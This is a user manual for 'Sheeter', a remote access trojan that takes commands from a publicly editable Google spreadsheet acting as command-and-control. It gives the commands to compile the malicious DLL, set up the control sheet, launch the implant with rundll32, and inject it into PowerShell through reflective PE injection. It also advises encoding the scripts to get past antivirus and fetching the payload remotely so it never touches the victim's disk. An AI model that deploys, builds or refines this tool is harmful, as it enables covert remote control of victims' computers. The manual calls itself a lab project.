   _____ _    _ ______ ______ _______ ______ _____  
  / ____| |  | |  ____|  ____|__   __|  ____|  __ \ 
 | (___ | |__| | |__  | |__     | |  | |__  | |__) |
  \___ \|  __  |  __| |  __|    | |  |  __| |  _  / 
  ____) | |  | | |____| |____   | |  | |____| | \ \ 
 |_____/|_|  |_|______|______|  |_|  |______|_|  \_\
                                                    

		Sheeter - A google spreadsheet rat
				---- User Manual ----

				------ Notes ------
A few key notes i must make Before you continue reading....
Note that this project is compiled of 2 stages, one stage is the rat itself
and the second stage is a little modified version of the original Invoke-ReflectivePEInjection
that can be found on the powersploit project page

You will also find in the second stage an Invoke-SheeterReflectivePE scripts, Which is a modified and lighter
version of the original.

No attempts to evade antiviruses where made when writing the Invoke-SheeterReflectivePE
You can do this on your own by using different PowerShell encoders.


				------ The sheeter Flow ------

		|------------------------------|
		|Get Raw json from  spreadsheet| <---- Note that there is no api use here, therefore this 
		|------------------------------|		Rat can also operate api less but it wont return output.
					||
					||
				   \  /
					\/
		|------------------------------------|
		|Parse the random value and the token| <---- This logic will use a user given token in cases where
		|------------------------------------|		 a token that used stopped working.....(it basically self updates)
					||
					||
				   \  /
					\/
		|------------------------------------|
		| Parse Commands and Execute them 	 |
		|			on by one				 | 
		|------------------------------------|
					||
					||
				   \  /
					\/
		|------------------------------------|
		| try to return the output using the |
		| google sheets Api, use the token in| <--- Note that you can also just write the output directly to local file
		| config or the one given in the     |
		|  second field						 | 
		|------------------------------------|
		
		
		
				------ Usage ------
				
				
				
Note!! You can skip to the "first run" section
if you don’t plan to make and changes or to recompile the project
	
------ Creating Credentials and Token files ------
This step is not a must, and you can skip it
in this step you will generate a new credentials and 
token files. you can also use the supplied ones for a quick
out of the box experience.

1. Create the credentials.json by going to the following link:
   https://developers.google.com/sheets/api/quickstart/go

   Then press the blue 
   "Enable the Google Sheets API"

2. Log in to you google account (if not already logged on)
3. Just give your project a name you like and press NEXT
4. Pick the "Desktop app" and press create
5. Download the file and save it in the Client folder.

Now if you chose to do this you MUST change the 'configFile' in the config.go
file in the stage1 Folder and recompile the whole thing.
you can just copy paste the content of the credentials.json to that value
but remember to escape all the " with \"


6. Create the Token by running the Client.py with the flag -g
	python client.py -g

if the credentials.json is correct and valid, two token files will be created
one json and one pickle.
the pickle file will be used by the scripts itself and will be sent and updated 
each time you run the script.
it will also be used when using the script in interactive mode to send a valid
token to the sheeter rat to be used for the api.

the token.json file contains the same token just in the json format and you 
need to put it inside config.go file under the 'googleToken' variable
THIS IS NOT A MUST IN YOU CAN LEAVE IT BLANK!

------ Configuration ------
In the stage1 folder there is a config.go file that contains all the configuration
options that can be supplied to the sheeter rat.

configFile - The contents of the Credentials.json file created in the previous step
			 Notice that this can be empty but no output will be returned back to the
			 spreadsheet.
			 
googleToken - The contents of the token.json file created in the previous step.
			  This can be empty as well and supplied later in the spreadsheet itself 
			  (The client.py does so automatically.)
			  
spreadsheetID - This is the spreadsheet id that will be used as a CNC
				This parameter is a must!

spreadsheetJsonTmplate - The template later used with the id to receive the json format
				of the spreadsheet. Notice that no google api is used.
				You should probably not change this
				

googleSpreadSheetPrivURL - The scope of permissions to be used, 'spreadsheets' is RW
						   You should probably not change this

regexCompiled - Regex that is used to get the spreadsheet data from the json.
				You should probably not change this.

flagSID - The random flag used to check if the command that supplied by the spreadsheet was 
		  Already executed.
		  You should probably not change this.

		  
loopSleepSeconds - Amount in the seconds to wait between spreadsheet checks

commandTimeout - Timeout to wait for the output of the commands that are executed.
				 Just so if there’s a blocking command, the rat wont stop.
				 
writeToDisk - Bool to determine if the rat should create an output file for the 
			  Commands being executed. you can use this as a backup in case the api
			  Stops Working.
			  
			  
outputFile - Path to the output file created when using 'writeToDisk'


------ Creating the CNC spreadsheet ------
The rat communicates over a google spreadsheet so you probably want to create one.

1. Go to your spreadsheets google page
	https://docs.google.com/spreadsheets
	
2. Create a new spreadsheet and name it however you like

3. Press the Share button and create a link

4. Make sure the link permissions are as followed:
	- Anyone with link can access it
	- Everyone is an editor

5. Go to the file option in the task bar and press "Publish to the web"
   Make sure that you publish the entire document.
   Make sure the "Automatically republish" option is on
   
6. Now you can use this spreadsheet as your cnc, make sure you copy your id from
   the URL, it should look something like this
   https://docs.google.com/spreadsheets/d/YOU ID IS HERE/edit#gid=0

----- Compiling ------
This is probably the trickiest part
You don’t have to compile a new project, just use the dll supplied in the 
release folder.

things you will need:

latest golang version.
python3
TDM-GCC <- http://tdm-gcc.tdragon.net/download

installing the go packages:
	go get -v -u google.golang.org/api/sheets/v4
	go get -v -u golang.org/x/oauth2/google

installing python packages:
	pip install --upgrade google-api-python-client google-auth-httplib2 google-auth-oauthlib


1. Open a new command prompt in your stage1 folder
1. Create archive and header files.
	
	go build -buildmode=c-archive

2. Move header files that have been created to the cfiles location
	move *.h cfiles\main.h
	move *.a sheeter.a

3. Compile whole project
	gcc -shared -pthread -o sheeter.dll cfiles\main.c sheeter.a -lwinmm -lntdll -lws2_32

4. Remove command just in case you want to recompile
	:del *.dll *.a *.h cfiles\*.h
	
If everything went smooth a dll should appear in your stage1 folder

----- First run ------

1. Running the client
First thing you want to make sure that your client.py is working
If you created a new spreadsheet and are not using the default one
make sure you change the CONST values in the client.py script or
have supplied the -id flag

We will be using the -i flag with the default spreadsheet to run our commands
There are some more useful flags you can use, you can run client.py with the -h flag
to see the help message


Command:
	python client.py -i

This will enter the interactive mode,
Type in some commands
press enter and then enter again to validate your commands
and check your spreadsheet file for changes.
If your spreadsheet changed then you are ready to go.

2. running the rat
I will use the already compiled dll in the release folder.
You can run the dll using a few methods but ill just use rundll32 with the Run
flag as its main function

Command:
	rundll32.exe sheeter.dll Run

Notice that no output will be created when running with rundll32.


3. Enjoying the fruits of your labour:
now you can use your client.py to run commands and check their output 


----- Stage 2 run ------
Stage 2 is the dll injection stage.
i chose to use the Invoke-ReflectivePEInjection method to inject my dll to the running powershell process
this is done in a lab environment and notice that there is no attempt to hide the Invoke-ReflectivePEInjection
script.
A GOOD ANTIVIRUS WILL PRORABLY MARK THIS MALLICIOUS!!!
If you want to bypass an antivirus i would recommend using some kind of powershell encoder to stage the 
Invoke-ReflectivePEInjection script.

Notice that in the Stage 2 folder there are two powershell scripts:
Invoke-ReflectivePEInjection - the original used in the powersploit project
Invoke-SheeterReflectivePE.ps1 - slightly lighter and modified version I made that ill be using


One more note, in this example the dll is present on the victims’ disk.
This is stupid because the whole point of a Reflective PE Injection is to load up the dll directly to memory.
In a real-world scenario i will be getting my $PEBytes from a remote location without touching the victims’ disk.
But this is a lab environment, So ill be just placing it in the some folder with the powershell script :)

Commands:
Open up a powershell window
Load your Invoke-SheeterReflectivePE.ps1 scripts like this

	. {SCRIPT PATH}\Invoke-SheeterReflectivePE.ps1

Read the dll bytes to a variable
	$PEBytes = [IO.File]::ReadAllBytes('{DLL PATH}')
	
run the Invoke-ReflectivePEInjection  Command with the debug and Verbose flag just to see some output
	Invoke-ReflectivePEInjection -PEBytes $PEBytes -Verbose -Debug
	
Note that loading the dll will take a few seconds because it is so large.
You should also see some log output.
After loading the dll you can use the client.py as usual


